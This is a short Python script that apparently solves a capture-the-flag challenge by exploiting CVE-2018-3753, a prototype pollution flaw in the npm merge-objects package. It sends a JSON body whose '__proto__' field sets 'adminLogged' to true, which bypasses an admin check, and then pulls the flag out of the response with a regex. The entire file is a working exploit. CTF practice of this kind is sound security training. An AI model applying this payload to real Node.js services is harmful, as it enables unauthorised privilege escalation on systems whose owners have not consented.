#!/usr/bin/env python3
''' CVE-2018-3753 '''
import requests, re

reg = r'flag{.*?}'
site = "http://hi-admin.challs.olicyber.it/hi"
payload = { # prototye pollution https://security.snyk.io/vuln/npm:merge-objects:20180415
    "name":"bosio",
    "__proto__":{
        "adminLogged":True
    }
}
r = requests.post(site, json=payload)
print(re.findall(reg, r.text)[0])